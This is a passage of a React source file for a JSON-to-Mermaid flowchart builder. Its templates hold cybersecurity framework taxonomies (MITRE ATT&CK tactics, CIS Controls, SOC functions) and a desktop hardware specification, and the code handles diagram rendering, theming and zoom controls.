                "compliance": [
                    "Compliance with legal and contractual requirements",
                    "Information security reviews"
                ]
            }
        }
    },
    "mitre_attack": {
        name: "MITRE ATT&CK",
        description: "MITRE Adversarial Tactics, Techniques, and Common Knowledge framework",
        data: {
            "name": "MITRE ATT&CK Framework",
            "category": "Adversarial Tactics and Techniques",
            "tactics": {
                "initial_access": [
                    "Drive-by Compromise",
                    "Exploit Public-Facing Application",
                    "External Remote Services",
                    "Hardware Additions",
                    "Replication Through Removable Media",
                    "Spearphishing Attachment",
                    "Spearphishing Link",
                    "Spearphishing via Service",
                    "Supply Chain Compromise",
                    "Trusted Relationship",
                    "Valid Accounts"
                ],
                "execution": [
                    "Command and Scripting Interpreter",
                    "Container Administration Command",
                    "Deploy Container",
                    "Exploitation for Client Execution",
                    "Inter-Process Communication",
                    "Local Job Scheduling",
                    "Scheduled Task/Job",
                    "Server Software Component",
                    "Software Deployment Tools",
                    "System Commands",
                    "User Execution"
                ],
                "persistence": [
                    "Account Manipulation",
                    "Boot or Logon Autostart Execution",
                    "Boot or Logon Initialization Scripts",
                    "Browser Extensions",
                    "Compromise Client Software Binary",
                    "Create Account",
                    "Create or Modify System Process",
                    "Event Triggered Execution",
                    "External Remote Services",
                    "Hijack Execution Flow",
                    "Implant Internal Image",
                    "Modify Authentication Process",
                    "Office Application Startup",
                    "Pre-OS Boot",
                    "Scheduled Task/Job",
                    "Server Software Component",
                    "Traffic Signaling",
                    "Valid Accounts"
                ],
                "privilege_escalation": [
                    "Abuse Elevation Control Mechanism",
                    "Access Token Manipulation",
                    "Boot or Logon Autostart Execution",
                    "Boot or Logon Initialization Scripts",
                    "Create or Modify System Process",
                    "Escape to Host",
                    "Event Triggered Execution",
                    "Exploitation for Privilege Escalation",
                    "Hijack Execution Flow",
                    "Implant Internal Image",
                    "Modify Authentication Process",
                    "Process Injection",
                    "Scheduled Task/Job",
                    "Server Software Component",
                    "Sudo and Sudo Caching",
                    "Valid Accounts"
                ],
                "defense_evasion": [
                    "Abuse Elevation Control Mechanism",
                    "Access Token Manipulation",
                    "BITS Jobs",
                    "Boot or Logon Autostart Execution",
                    "Boot or Logon Initialization Scripts",
                    "Build Image on Host",
                    "Compromise Client Software Binary",
                    "Create or Modify System Process",
                    "Deploy Container",
                    "Direct Volume Access",
                    "Domain Trust Modification",
                    "Escape to Host",
                    "Event Triggered Execution",
                    "Execution Guardrails",
                    "Exploit Public-Facing Application",
                    "Hide Artifacts",
                    "Hijack Execution Flow",
                    "Implant Internal Image",
                    "Impair Defenses",
                    "Indicator Removal",
                    "Indirect Command Execution",
                    "Input Capture",
                    "Inter-Process Communication",
                    "Masquerading",
                    "Modify Authentication Process",
                    "Obfuscated Files or Information",
                    "Office Application Startup",
                    "Pre-OS Boot",
                    "Process Injection",
                    "Reflective Code Loading",
                    "Rogue Domain Controller",
                    "Rootkit",
                    "Scheduled Task/Job",
                    "Server Software Component",
                    "Signed Binary Proxy Execution",
                    "Software Packing",
                    "Subvert Trust Controls",
                    "System Binary Proxy Execution",
                    "System Script Proxy Execution",
                    "Template Injection",
                    "Traffic Signaling",
                    "Trusted Developer Utilities Proxy Execution",
                    "Use Alternate Authentication Material",
                    "Valid Accounts",
                    "Virtualization/Sandbox Evasion"
                ]
            }
        }
    },
    "cis_controls": {
        name: "CIS Controls",
        description: "Center for Internet Security Critical Security Controls",
        data: {
            "name": "CIS Critical Security Controls",
            "category": "Cybersecurity Best Practices",
            "basic_controls": [
                "CIS Control 1: Inventory and Control of Enterprise Assets",
                "CIS Control 2: Inventory and Control of Software Assets", 
                "CIS Control 3: Data Protection",
                "CIS Control 4: Secure Configuration of Enterprise Assets and Software",
                "CIS Control 5: Account Management",
                "CIS Control 6: Access Control Management"
            ],
            "foundational_controls": [
                "CIS Control 7: Continuous Vulnerability Management",
                "CIS Control 8: Audit Log Management",
                "CIS Control 9: Email and Web Browser Protections",
                "CIS Control 10: Malware Defenses",
                "CIS Control 11: Data Recovery",
                "CIS Control 12: Network Infrastructure Management"
            ],
            "organizational_controls": [
                "CIS Control 13: Security Awareness and Skills Training",
                "CIS Control 14: Service Provider Management",
                "CIS Control 15: Secure Software Development",
                "CIS Control 16: Application Software Security",
                "CIS Control 17: Incident Response Management",
                "CIS Control 18: Penetration Testing"
            ]
        }
    },
    "security_operations_center": {
        name: "Security Operations Center (SOC)",
        description: "SOC processes, tools, and procedures for cybersecurity monitoring",
        data: {
            "name": "Security Operations Center Framework",
            "category": "Security Operations",
            "soc_functions": {
                "monitoring": [
                    "24/7 Security Monitoring",
                    "Threat Detection",
                    "Incident Identification",
                    "Log Analysis",
                    "Network Traffic Analysis",
                    "Endpoint Monitoring"
                ],
                "incident_response": [
                    "Incident Triage",
                    "Investigation",
                    "Containment",
                    "Eradication",
                    "Recovery",
                    "Lessons Learned"
                ],
                "threat_intelligence": [
                    "Threat Intelligence Gathering",
                    "IOC Management",
                    "Threat Hunting",
                    "Vulnerability Assessment",
                    "Risk Analysis"
                ],
                "tools_and_technologies": [
                    "SIEM (Security Information and Event Management)",
                    "SOAR (Security Orchestration, Automation and Response)",
                    "EDR (Endpoint Detection and Response)",
                    "NDR (Network Detection and Response)",
                    "Threat Intelligence Platforms",
                    "Vulnerability Scanners"
                ]
            }
        }
    },
    "computer_hardware": {
        name: "Computer Hardware Specification",
        description: "Complete computer hardware configuration and components",
        data: {
            "system_type": "Desktop Computer",
            "cpu": {
                "brand": "AMD",
                "model": "Ryzen 7 5800X",
                "cores": 8,
                "threads": 16,
                "base_clock": "3.8 GHz",
                "boost_clock": "4.7 GHz",
                "architecture": "Zen 3",
                "socket": "AM4",
                "tdp": "105W"
            },
            "ram": {
                "capacity": "32GB",
                "type": "DDR4",
                "speed": "3200 MHz",
                "channels": "Dual Channel",
                "modules": [
                    "16GB DDR4-3200",
                    "16GB DDR4-3200"
                ],
                "total_slots": 4,
                "used_slots": 2
            },
            "rom": {
                "type": "BIOS/UEFI",
                "version": "F14",
                "manufacturer": "ASUS",
                "features": [
                    "UEFI Boot",
                    "Secure Boot",
                    "Fast Boot",
                    "BIOS Flashback"
                ]
            },
            "storage": {
                "primary": {
                    "type": "NVMe SSD",
                    "capacity": "1TB",
                    "model": "Samsung 980 Pro",
                    "interface": "PCIe 4.0 NVMe",
                    "read_speed": "7000 MB/s",
                    "write_speed": "5000 MB/s"
                },
                "secondary": {
                    "type": "SATA SSD",
                    "capacity": "500GB",
                    "model": "Crucial MX500",
                    "interface": "SATA 3.0",
                    "read_speed": "560 MB/s",
                    "write_speed": "510 MB/s"
                },
                "tertiary": {
                    "type": "HDD",
                    "capacity": "2TB",
                    "model": "Seagate Barracuda",
                    "interface": "SATA 3.0",
                    "rpm": "7200",
                    "cache": "256MB"
                }
            },
            "gpu": {
                "brand": "NVIDIA",
                "model": "RTX 4070",
                "vram": "12GB",
                "memory_type": "GDDR6X",
                "cuda_cores": "5888",
                "rt_cores": "46",
                "tensor_cores": "184",
                "base_clock": "1920 MHz",
                "boost_clock": "2475 MHz",
                "tgp": "200W",
                "features": [
                    "DLSS 3",
                    "Ray Tracing",
                    "AV1 Encoding",
                    "8K Display Support"
                ]
            },
            "motherboard": {
                "manufacturer": "ASUS",
                "model": "B550M-PLUS",
                "form_factor": "Micro-ATX",
                "chipset": "AMD B550",
                "socket": "AM4",
                "memory_slots": 4,
                "max_memory": "128GB",
                "pcie_slots": [
                    "1x PCIe 4.0 x16",
                    "1x PCIe 3.0 x16",
                    "2x PCIe 3.0 x1"
                ],
                "storage_interfaces": [
                    "2x M.2 slots (NVMe)",
                    "4x SATA 6Gb/s",
                    "1x SATA Express"
                ],
                "audio": "Realtek ALC887",
                "lan": "Realtek RTL8111H Gigabit LAN"
            },
            "network": {
                "wifi": {
                    "standard": "WiFi 6 (802.11ax)",
                    "frequency": "2.4 GHz / 5 GHz",
                    "max_speed": "2.4 Gbps",
                    "encryption": "WPA3",
                    "antenna": "2x External Antennas"
                },
                "ethernet": {
                    "type": "Gigabit Ethernet",
                    "ports": 1,
                    "speed": "1000 Mbps",
                    "controller": "Realtek RTL8111H"
                }
            },
            "power_supply": {
                "wattage": "850W",
                "efficiency": "80+ Gold",
                "modularity": "Fully Modular",
                "form_factor": "ATX",
                "features": [
                    "Single +12V Rail",
                    "Active PFC",
                    "DC-DC Design",
                    "Low Noise Fan"
                ]
            },
            "circuits": {
                "pcb_boards": [
                    "Main Motherboard PCB",
                    "GPU PCB",
                    "Power Supply PCB",
                    "Storage Controller PCB"
                ],
            "status": "All PCB circuits working",
            "components": [
                "Voltage Regulators",
                "Capacitors",
                "Inductors",
                "Chip Resistors",
                "Diodes and Transistors"
            ]
        },
        "cooling": {
            "cpu_cooler": {
                "type": "AIO Water Cooling",
                "model": "NZXT Kraken X63",
                "radiator_size": "280mm",
                "fans": 2,
                "fan_speed": "1800 RPM",
                "pump_speed": "Variable"
            },
            "case_fans": [
                {
                    "position": "Front Intake",
                    "size": "140mm",
                    "quantity": 2,
                    "rpm": "1500"
                },
                {
                    "position": "Rear Exhaust",
                    "size": "120mm",
                    "quantity": 1,
                    "rpm": "1400"
                },
                {
                    "position": "Top Exhaust",
                    "size": "120mm",
                    "quantity": 1,
                    "rpm": "1400"
                }
            ]
        },
        "connections": {
            "internal": [
                "CPU to Motherboard Socket",
                "RAM to DIMM Slots",
                "GPU to PCIe Slot",
                "NVMe SSD to M.2 Slot",
                "SATA SSDs to SATA Ports",
                "HDD to SATA Ports",
                "AIO Pump to CPU Header",
                "Fans to Fan Headers",
                "Front Panel Connectors",
                "USB 3.0 Header",
                "Power Supply to Components"
            ],
            "external": [
                "Power Cord to PSU",
                "DisplayPort to Monitor",
                "HDMI to Secondary Monitor",
                "USB 3.0 to Peripherals",
                "USB-C to Mobile Devices",
                "Audio Jack to Speakers",
                "Ethernet Cable (Optional)",
                "WiFi Antennas"
            ],
            "peripheral_devices": [
                "Keyboard - USB",
                "Mouse - USB",
                "Webcam - USB",
                "External HDD - USB 3.0",
                "Printer - USB/Network",
                "Headset - USB/Audio Jack",
                "Gamepad Controller - USB/Wireless",
                "Card Reader - USB"
            ]
        },
        "operating_system": {
            "name": "Windows 11 Pro",
            "version": "22H2",
            "architecture": "64-bit",
            "build": "22621",
            "features": [
                "DirectX 12",
                "WDDM 3.0",
                "Hardware Accelerated GPU Scheduling",
                "BitLocker Encryption",
                "Hyper-V",
                "Windows Subsystem for Linux",
                "Microsoft Store",
                "Game Mode",
                "Auto HDR",
                "DirectStorage API"
            ]
        }
    }
},
"computer_hardware_detailed": {
    name: "Detailed Computer Hardware with Connections",
    description: "Comprehensive computer hardware flowchart with all connections",
    data: {
        "computer_system": "High-Performance Desktop",
        "central_processing_unit": {
            "manufacturer": "AMD",
            "model": "Ryzen 7 5800X",
            "specifications": {
                "cores": "8 Cores",
                "threads": "16 Threads",
                "base_clock": "3.8 GHz",
                "max_boost": "4.7 GHz",
                "cache": "L3: 32MB, L2: 4MB, L1: 512KB",
                "tdp": "105 Watts",
                "socket": "AM4"
            },
            "connections": [
                "Connected to Motherboard CPU Socket",
                "Powered by CPU Power Connector (8-Pin)",
                "Cooled by AIO Water Cooler",
                "Connected to RAM via Infinity Fabric"
            ]
        },
        "memory_modules": {
            "total_capacity": "32GB DDR4-3200",
            "configuration": [
                {
                    "slot": "DIMM_A2",
                    "module": "16GB DDR4-3200",
                    "brand": "Corsair Vengeance LPX",
                    "cl": "16-18-18-36"
                },
                {
                    "slot": "DIMM_B2",
                    "module": "16GB DDR4-3200",
                    "brand": "Corsair Vengeance LPX",
                    "cl": "16-18-18-36"
                }
            ],
            "dual_channel": "Enabled",
            "xmp_profile": "Enabled",
            "connections": [
                "Connected to CPU via Memory Controller",
                "Powered by Motherboard DIMM Slots",
                "Running in Dual Channel Configuration"
            ]
        },
        "bios_uefi": {
            "type": "UEFI",
            "version": "F14",
            "manufacturer": "ASUS",
            "features": [
                "Secure Boot Support",
                "Fast Boot Enabled",
                "BIOS Flashback Capability",
                "EZ Mode",
                "Advanced Mode",
                "CPU Overclocking",
                "Memory Overclocking",
                "Fan Control"
            ]
        },
        "storage_devices": {
            "nvme_ssd": {
                "model": "Samsung 980 Pro 1TB",
                "interface": "PCIe 4.0 x4 NVMe",
                "location": "M.2_1 Slot",
                "performance": "Read: 7000 MB/s, Write: 5000 MB/s",
                "interface_connections": "Connected to CPU PCIe 4.0 lanes"
            },
            "sata_ssd": {
                "model": "Crucial MX500 500GB",
                "interface": "SATA 6Gb/s",
                "location": "SATA Port 1",
                "performance": "Read: 560 MB/s, Write: 510 MB/s",
                "interface_connections": "Connected to SATA Controller"
            },
            "hdd": {
                "model": "Seagate Barracuda 2TB",
                "interface": "SATA 6Gb/s",
                "location": "SATA Port 2",
                "performance": "7200 RPM, 256MB Cache",
                "interface_connections": "Connected to SATA Controller"
            }
        },
        "graphics_processing_unit": {
            "manufacturer": "NVIDIA",
            "model": "RTX 4070 12GB",
            "interface": "PCIe 4.0 x16",
            "slot": "Primary PCIe Slot",
            "connectors": [
                "3x DisplayPort 1.4a",
                "1x HDMI 2.1"
            ],
            "power": "PCIe Cable (8-Pin + 8-Pin)",
            "thermal_solution": "Custom Air Cooler with Heat Pipes",
            "display_outputs": [
                "Primary Monitor - DisplayPort",
                "Secondary Monitor - HDMI"
            ]
        },
        "motherboard_details": {
            "model": "ASUS B550M-PLUS",
            "form_factor": "Micro-ATX",
            "chipset": "AMD B550",
            "socket": "AM4",
            "expansion_slots": [
                "1x PCIe 4.0 x16 (CPU)",
                "1x PCIe 3.0 x16 (Physical)",
                "2x PCIe 3.0 x1"
            ],
            "memory_support": {
                "slots": 4,
                "max_capacity": "128GB",
                "supported_types": "DDR4 2133/2400/2666/2933/3200/3600/4000"
            },
            "storage_interfaces": [
                "2x M.2 slots",
                "1x M.2 (PCIe 4.0 + SATA)",
                "1x M.2 (PCIe 3.0 + SATA)",
                "6x SATA 6Gb/s ports"
            ],
            "audio": "Realtek ALC887 8-Channel HD Audio",
            "network": {
                "wifi": "WiFi 6 (802.11ax)",
                "ethernet": "Realtek RTL8111H Gigabit LAN"
            },
            "usb_ports": [
                "1x USB 3.2 Gen2 Type-C (Front)",
                "1x USB 3.2 Gen1 (Front)",
                "2x USB 3.2 Gen2 (Rear)",
                "4x USB 2.0 (Rear)"
            ]
        },
        "network_configuration": {
            "wireless": {
                "standard": "WiFi 6 (802.11ax)",
                "frequency_bands": "2.4 GHz and 5 GHz",
                "max_theoretical_speed": "2.4 Gbps",
                "actual_throughput": "~800 Mbps",
                "security": "WPA3",
                "antennas": "2x External Magnetic Base",
                "connection_status": "Connected (5 GHz Band)"
            },
            "wired": {
                "type": "Gigabit Ethernet",
                "controller": "Realtek RTL8111H",
                "max_speed": "1000 Mbps (1 Gbps)",
                "connection_method": "Cable (Not Biased to Wireless)",
                "status": "Available, Optionally Used"
            }
        },
        "power_configuration": {
            "unit": "850W 80+ Gold Modular PSU",
            "efficiency": "80 Plus Gold Certified",
            "modularity": "Fully Modular Design",
            "rails": "Single +12V Rail",
            "certification": "ATX 12V v2.52",
            "protections": [
                "Over Voltage Protection",
                "Under Voltage Protection",
                "Over Current Protection",
                "Short Circuit Protection",
                "Over Power Protection",
                "Over Temperature Protection"
            ],
            "connectors": [
                "24-Pin ATX Motherboard",
                "8-Pin EPS CPU",
                "2x 8-Pin PCIe (GPU)",
                "6x SATA Power",
                "3x Molex 4-Pin",
                "1x Floppy 4-Pin"
            ]
        },
        "circuit_boards": {
            "main_motherboard_pcb": {
                "layers": "4-Layer PCB",
                "trace_width": "Optimized for Signal Integrity",
                "components": "All Surface Mount Components",
                "status": "Working Correctly"
            },
            "graphics_card_pcb": {
                "design": "Custom PCB Layout",
                "power_delivery": "12-Phase VRM",
                "components": "All Components Operational",
                "status": "Working Correctly"
            },
            "storage_pcbs": {
                "nvme_controller": "NVMe Controller Circuit Working",
                "sata_controller": "SATA Controller Circuit Working",
                "status": "All Storage Circuits Working"
            },
            "overall_status": "All PCB circuits working and tested"
        },
        "cooling_solution": {
            "cpu_cooling": {
                "type": "AIO Water Cooler",
                "model": "NZXT Kraken X63 280mm",
                "radiator": "280mm (2x 140mm fans)",
                "pump": "Variable Speed Pump",
                "tubing": "Low-Profile Rubber Tubing",
                "compatibility": "AM4/AM5/LGA1700",
                "connections": "Connected to CPU_FAN Header and SATA Power"
            },
            "case_airflow": {
                "front_fans": "2x 140mm Intake",
                "rear_fan": "1x 120mm Exhaust",
                "top_fan": "1x 120mm Exhaust (Optional)",
                "positive_pressure": "Optimized for Dust Prevention"
            },
            "thermal_paste": "High-Performance Thermal Compound Applied"
        },
        "connection_diagram": {
            "internal_connections": {
                "power_connections": [
                    "24-Pin ATX from PSU to Motherboard",
                    "8-Pin EPS from PSU to Motherboard CPU Power",
                    "2x 8-Pin PCIe from PSU to GPU",
                    "SATA Power from PSU to Storage Drives",
                    "SATA Power from PSU to AIO Pump",
                    "Fan Power from Motherboard to Case Fans"
                ],
                "data_connections": [
                    "NVMe SSD in M.2 Slot (Direct to CPU)",
                    "SATA SSD to SATA Port 1",
                    "HDD to SATA Port 2",
                    "GPU in PCIe 4.0 x16 Slot",
                    "Front Panel USB to Internal Header",
                    "Front Panel Audio to Audio Header"
                ],
                "control_connections": [
                    "Front Panel Power Button",
                    "Front Panel Reset Button",
                    "Front Panel LED Indicator",
                    "HDD Activity LED",
                    "Power LED"
                ]
            },
            "external_connections": {
                "power": "IEC C13 Power Cord to PSU",
                "display": [
                    "Primary Monitor via DisplayPort",
                    "Secondary Monitor via HDMI"
                ],
                "usb_devices": [
                    "Keyboard - USB 3.0",
                    "Mouse - USB 2.0",
                    "Webcam - USB 3.0",
                    "External HDD - USB 3.0"
                ],
                "audio": [
                    "Desktop Speakers - 3.5mm Jack",
                    "USB Headset - USB Port"
                ],
                "network": "WiFi 6 Antennas (No Ethernet Cable)",
                "peripheral": "USB DAC/AMP for Headphones"
            }
        },
        "operating_system": {
            "name": "Windows 11 Pro",
            "version": "22H2 (Build 22621.2861)",
            "architecture": "64-bit",
            "license": "Digital License",
            "features_enabled": [
                "DirectX 12 Ultimate",
                "Hardware-Accelerated GPU Scheduling",
                "Auto HDR",
                "DirectStorage API",
                "BitLocker Device Encryption",
                "Windows Security",
                "Hyper-V",
                "WSL 2 (Windows Subsystem for Linux)",
                "Windows Terminal",
                "Microsoft Store",
                "Xbox Game Bar",
                "Windows Sandbox",
                "Remote Desktop",
                "Group Policy Management"
            ],
            "updates": "Current and Up to Date"
        }
    }
}
};

function JSONToMermaid() {
    const theme = useColorScheme();
    const diagramRef = useRef(null);
    const [diagram, setDiagram] = useState("");
    const [diagramValid, setDiagramValid] = useState(false);
    const diagramFull = `\`\`\`mermaid\n${diagram}\n\`\`\``;
    const [direction, setDirection] = useState("LR");
    const directions = [
        { name: "LR", friendlyName: "Left to Right" },
        { name: "RL", friendlyName: "Right to Left" },
        { name: "TB", friendlyName: "Top to Bottom" },
        { name: "TD", friendlyName: "Top-Down" },
        { name: "BT", friendlyName: "Bottom to Top" }
    ];
    const [outputTab, setOutputTab] = useState("preview");
    const [isDarkMode, setIsDarkMode] = useState(() => {
        const saved = localStorage.getItem('wf-builder-theme');
        return saved ? saved === 'dark' : true; // Default to dark mode
    });
    const [isJsonFullscreen, setIsJsonFullscreen] = useState(false);

    const toggleTheme = () => {
        const newTheme = !isDarkMode;
        setIsDarkMode(newTheme);
        localStorage.setItem('wf-builder-theme', newTheme ? 'dark' : 'light');
        
        // Update body data-theme attribute for CSS
        document.body.setAttribute('data-theme', newTheme ? 'dark' : 'light');
    };

    const toggleJsonFullscreen = () => {
        setIsJsonFullscreen(!isJsonFullscreen);
    };

    // Set initial theme on component mount
    useEffect(() => {
        document.body.setAttribute('data-theme', isDarkMode ? 'dark' : 'light');
    }, []);

    // Handle ESC key to exit JSON fullscreen
    useEffect(() => {
        const handleKeyDown = (e) => {
            if (e.key === 'Escape' && isJsonFullscreen) {
                setIsJsonFullscreen(false);
            }
        };
        
        if (isJsonFullscreen) {
            document.addEventListener('keydown', handleKeyDown);
        }
        
        return () => {
            document.removeEventListener('keydown', handleKeyDown);
        };
    }, [isJsonFullscreen]);
    const outputTabs = [
        { name: "preview", friendlyName: "Preview" },
        { name: "code", friendlyName: "Code" }
    ];
    const outputTabMap = {
        code: React.createElement(JSONToMermaidCode, { code: diagramFull, isDarkMode: isDarkMode }),
        preview: React.createElement(JSONToMermaidPreview, { diagramRef: diagramRef, isDarkMode: isDarkMode }, diagramValid ?
            React.createElement("div", { 
                ref: diagramRef, 
                className: "mermaid w-full h-full flex items-center justify-center",
                style: { minHeight: '400px' }
            })
            : React.createElement(JSONToMermaidError, null, diagram))
    };
    const [selectedTemplate, setSelectedTemplate] = useState("custom");
    const [jsonInput, setJsonInput] = useState(`{
        "id": "CyberWolf",
  "position": {
          "x": 45,
          "y": 12,
          "z": 250
  },
  "sleeping": false,
  "items": [
          "Phishing Attack",
          "DDoS Attack",
          "SQL Injection",
          "Man-in-the-Middle",
          "Ransomware",
          "Cross-Site Scripting (XSS)",
          "Brute Force Attack",
          "Malware Injection",
          "Zero-Day Exploit",
          "Trojan Horse"
  ]
}`);
      
    // Handle template selection
    const handleTemplateChange = (templateKey) => {
        setSelectedTemplate(templateKey);
        if (templateKey !== "custom") {
            const template = CYBER_ATTACK_TEMPLATES[templateKey];
            setJsonInput(JSON.stringify(template.data, null, 2));
        }
    };

    useEffect(() => {
        try {
            const parsed = JSON.parse(jsonInput);
            const lines = Utils.flowchartFromJSON(parsed);
            const mermaidText = `graph ${direction}\n${lines.join("\n")}`;
            setDiagram(mermaidText);
            setDiagramValid(true);
        }
        catch (e) {
            setDiagram("Invalid JSON");
            setDiagramValid(false);
        }
    }, [jsonInput, direction]);
    useEffect(() => {
        if (!diagramRef.current || !diagramValid)
            return;
        
        // Clear any existing content
        diagramRef.current.innerHTML = '';
        
        mermaid.initialize({
            startOnLoad: false,
            theme,
            flowchart: {
                diagramPadding: 20,
                useMaxWidth: true,
                htmlLabels: true
            },
            securityLevel: 'loose'
        });
        
        // Set the diagram content
        diagramRef.current.innerHTML = diagram;
        
        // Reset mermaid's internal flag to allow re-rendering
        diagramRef.current.removeAttribute("data-processed");
        
        try {
            // Render the diagram
            mermaid.run({ 
                nodes: [diagramRef.current],
                suppressErrors: true
            });
        }
        catch (err) {
            console.error("Couldn't render the chart. Error:", err);
            // Show error in the diagram area
            diagramRef.current.innerHTML = `<div class="text-red-600 p-4">Error rendering diagram: ${err.message}</div>`;
        }
    }, [diagram, theme, outputTab]);
    const templateOptions = [
        { name: "custom", friendlyName: "Custom JSON" },
        { name: "xss", friendlyName: "XSS Attack" },
        { name: "csrf", friendlyName: "CSRF Attack" },
        { name: "ddos", friendlyName: "DDoS Attack" },
        { name: "dos", friendlyName: "DoS Attack" },
        { name: "xxe", friendlyName: "XXE Attack" },
        { name: "html_injection", friendlyName: "HTML Injection" },
        { name: "sql_injection", friendlyName: "SQL Injection" },
        { name: "buffer_overflow", friendlyName: "Buffer Overflow" },
        { name: "privilege_escalation", friendlyName: "Privilege Escalation" },
        { name: "social_engineering", friendlyName: "Social Engineering" },
        { name: "phishing", friendlyName: "Phishing" },
        { name: "ransomware", friendlyName: "Ransomware" },
        { name: "insider_threats", friendlyName: "Insider Threats" },
        { name: "man_in_the_middle", friendlyName: "MITM Attack" },
        { name: "zero_day", friendlyName: "Zero-Day Exploit" },
        { name: "comprehensive_cyber_attacks", friendlyName: "Comprehensive Cyber Attacks" },
        { name: "owasp_top_10", friendlyName: "OWASP Top 10" },
        { name: "nist_cybersecurity_framework", friendlyName: "NIST Cybersecurity Framework" },
        { name: "iso_27001", friendlyName: "ISO 27001" },
        { name: "mitre_attack", friendlyName: "MITRE ATT&CK" },
        { name: "cis_controls", friendlyName: "CIS Controls" },
        { name: "security_operations_center", friendlyName: "Security Operations Center" },
        { name: "computer_hardware", friendlyName: "Computer Hardware" },
        { name: "computer_hardware_detailed", friendlyName: "Computer Hardware Detailed" }
    ];

    return (React.createElement("div", { className: `flex flex-col lg:flex-row gap-6 h-screen lg:h-max lg:min-h-screen p-6 transition-colors duration-200 ${
        isDarkMode 
            ? 'text-gray-100' 
            : 'bg-gray-100 text-gray-900'
    }`, style: isDarkMode ? { backgroundColor: '#212121' } : {} },
        React.createElement(ThemeToggle, { isDarkMode: isDarkMode, onToggle: toggleTheme }),
        React.createElement("div", { className: "flex flex-col flex-1" },
            React.createElement("div", { className: "mb-4" },
                React.createElement(SelectMenu, { label: "Template", options: templateOptions, onChange: (e) => handleTemplateChange(e.target.value), defaultValue: selectedTemplate, isDarkMode: isDarkMode })),
            React.createElement(Textarea, { 
                id: "json-input", 
                name: "json_input", 
                label: "JSON", 
                value: jsonInput, 
                onChange: (e) => setJsonInput(e.target.value), 
                isDarkMode: isDarkMode,
                isFullscreen: isJsonFullscreen,
                onFullscreenToggle: toggleJsonFullscreen
            })),
        React.createElement("div", { className: "flex flex-col flex-1" },
            React.createElement(SelectMenu, { label: "Direction", options: directions, onChange: (e) => setDirection(e.target.value), defaultValue: direction, isDarkMode: isDarkMode }),
            React.createElement(SegmentedControl, { segments: outputTabs, onChange: (tab) => setOutputTab(tab), isDarkMode: isDarkMode }),
            outputTabMap[outputTab])));
}
function JSONToMermaidCode({ code, isDarkMode = true }) {
    return (React.createElement("div", { className: "flex flex-col relative h-full" },
        React.createElement("div", { className: "absolute top-14 right-5" },
            React.createElement(CopyButton, { text: code })),
        React.createElement(Textarea, { id: "json-output", name: "json_output", label: "Code", value: code, readOnly: true, isDarkMode: isDarkMode })));
}
function JSONToMermaidError({ children }) {
    return (React.createElement("div", { className: "text-red-700 dark:text-red-400 font-bold grid place-items-center h-full" }, children));
}
function JSONToMermaidPreview({ children, diagramRef, isDarkMode = true }) {
    const [zoomLevel, setZoomLevel] = useState(1);
    const [panX, setPanX] = useState(0);
    const [panY, setPanY] = useState(0);
    const [isDragging, setIsDragging] = useState(false);
    const [dragStart, setDragStart] = useState({ x: 0, y: 0 });
    const [isFullscreen, setIsFullscreen] = useState(false);

    // Enhanced Mermaid configuration for better dark theme support
    useEffect(() => {
        if (diagramRef?.current) {
            const mermaidConfig = {
                theme: isDarkMode ? 'dark' : 'default',
                themeVariables: {
                    darkMode: isDarkMode,
                    primaryColor: isDarkMode ? '#374151' : '#FFFFFF',
                    primaryTextColor: isDarkMode ? '#FFFFFF' : '#000000',
                    primaryBorderColor: isDarkMode ? '#6B7280' : '#D1D5DB',
                    lineColor: isDarkMode ? '#FFFFFF' : '#6B7280',
                    secondaryColor: isDarkMode ? '#374151' : '#FFFFFF',
                    tertiaryColor: isDarkMode ? '#374151' : '#FFFFFF',
                    background: isDarkMode ? '#212121' : '#FFFFFF',
                    mainBkg: isDarkMode ? '#212121' : '#FFFFFF',
                    secondBkg: isDarkMode ? '#374151' : '#FFFFFF',
                    tertiaryBkg: isDarkMode ? '#374151' : '#FFFFFF',
                    nodeBkg: isDarkMode ? '#374151' : '#FFFFFF',
                    nodeBorder: isDarkMode ? '#6B7280' : '#D1D5DB',
                    clusterBkg: isDarkMode ? '#1F2937' : '#FFFFFF',
                    clusterBorder: isDarkMode ? '#4B5563' : '#D1D5DB',
                    defaultLinkColor: isDarkMode ? '#FFFFFF' : '#6B7280',
                    titleColor: isDarkMode ? '#FFFFFF' : '#000000',
                    nodeTextColor: isDarkMode ? '#FFFFFF' : '#000000'
                },
                flowchart: {
                    diagramPadding: 20,
                    useMaxWidth: true,
                    htmlLabels: true
                },
                securityLevel: 'loose'
            };
            
            mermaid.initialize(mermaidConfig);
        }
    }, [isDarkMode]);

    const handleZoomIn = () => {
        setZoomLevel(prev => Math.min(prev + 0.2, 3));
    };

    const handleZoomOut = () => {
        setZoomLevel(prev => Math.max(prev - 0.2, 0.3));
    };

    const handleReset = () => {
        setZoomLevel(1);
        setPanX(0);
        setPanY(0);
    };

    const handleMouseDown = (e) => {
        setIsDragging(true);
        setDragStart({ x: e.clientX - panX, y: e.clientY - panY });
    };

    const handleMouseMove = (e) => {
        if (isDragging) {
            setPanX(e.clientX - dragStart.x);
            setPanY(e.clientY - dragStart.y);
        }
    };

    const handleMouseUp = () => {
        setIsDragging(false);
    };

    const handleWheel = (e) => {
        e.preventDefault();
        const delta = e.deltaY > 0 ? -0.1 : 0.1;
        setZoomLevel(prev => Math.max(0.3, Math.min(3, prev + delta)));
    };

    const handleTouchStart = (e) => {
        if (e.touches.length === 1) {
            const touch = e.touches[0];
            setIsDragging(true);
            setDragStart({ x: touch.clientX - panX, y: touch.clientY - panY });
        }
    };

    const handleTouchMove = (e) => {
        if (isDragging && e.touches.length === 1) {
            const touch = e.touches[0];
            setPanX(touch.clientX - dragStart.x);
            setPanY(touch.clientY - dragStart.y);
        }
    };

    const handleTouchEnd = () => {
        setIsDragging(false);
    };

    const handleFullscreen = () => {
        if (!isFullscreen) {
            if (diagramRef?.current?.requestFullscreen) {
                diagramRef.current.requestFullscreen();
            } else if (diagramRef?.current?.webkitRequestFullscreen) {
                diagramRef.current.webkitRequestFullscreen();
            } else if (diagramRef?.current?.mozRequestFullScreen) {
                diagramRef.current.mozRequestFullScreen();
            } else if (diagramRef?.current?.msRequestFullscreen) {
                diagramRef.current.msRequestFullscreen();
            }
            setIsFullscreen(true);
        } else {
            if (document.exitFullscreen) {
                document.exitFullscreen();
            } else if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            } else if (document.mozCancelFullScreen) {
                document.mozCancelFullScreen();
            } else if (document.msExitFullscreen) {
                document.msExitFullscreen();
            }
            setIsFullscreen(false);
        }
    };


    // Handle ESC key to exit fullscreen
    useEffect(() => {
        const handleKeyDown = (e) => {
            if (e.key === 'Escape' && isFullscreen) {
